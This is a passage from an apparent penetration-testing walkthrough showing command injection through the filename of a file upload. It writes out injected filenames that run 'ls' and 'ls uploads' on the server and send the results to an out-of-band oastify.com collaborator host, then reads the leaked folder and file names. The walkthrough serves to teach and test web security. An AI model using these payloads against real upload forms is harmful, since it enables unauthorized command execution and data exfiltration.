...
It doesn't have to be "uname." We can also send an "ls" command  ( `filename="test123 $(curl $(ls).1kmh59amqrfg17glhd9bawa56wcn0do2.oastify.com) .PNG"` ). We poll again, and another request comes in. Looking at it, it says "uploads," meaning that the uploads folder exists. as shown in this SS ->
![[Screenshot From 2025-03-11 17-20-35.png]]




We can verify further by trying "ls uploads"  ( `filename="test123 $(curl $(ls uploads)  .1kmh59amqrfg17glhd9bawa56wcn0do2.oastify.com) .PNG"` ) . Depending on how the application works, this may or may not give an answer due to spacing within the `$(ls upload)` command. We try again, poll, and see a response: "test123.png," which was one of the first files we uploaded to the web server and we are getting it as result of this command.  
This confirms that we are successfully executing commands.
